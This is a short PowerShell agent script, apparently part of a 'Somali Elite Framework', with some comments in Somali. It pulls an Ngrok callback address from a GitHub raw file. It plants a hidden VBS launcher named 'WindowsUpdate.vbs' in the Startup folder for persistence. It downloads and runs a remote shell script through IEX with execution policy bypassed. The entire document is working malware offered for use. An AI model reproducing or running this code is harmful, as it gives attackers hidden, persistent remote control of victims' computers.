# Somali Elite Framework - Smart Agent
$CONN_URL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/connection.txt"
$GITHUB_SHELL = "https://raw.githubusercontent.com/KHAPIIP/Somali-Elite-Framework/main/shell.ps1"

# 1. Soo aqri cinwaanka Ngrok ee uu Python-kaagu hadda u soo diray GitHub
$RAW_DATA = (New-Object Net.WebClient).DownloadString($CONN_URL).Trim()
$HOST_NAME = $RAW_DATA.Split(":")[0]
$PORT = $RAW_DATA.Split(":")[1]

# 2. Persistence (Startup Folder)
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs"
$cmd = "powershell -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$GITHUB_SHELL')"
$vbs = 'Set objShell = WScript.CreateObject("WScript.Shell")' + "`n" + "objShell.Run ""$cmd"", 0"
Set-Content -Path $path -Value $vbs

# 3. Kici Shell-ka rasmiga ah
IEX(New-Object Net.WebClient).DownloadString($GITHUB_SHELL)
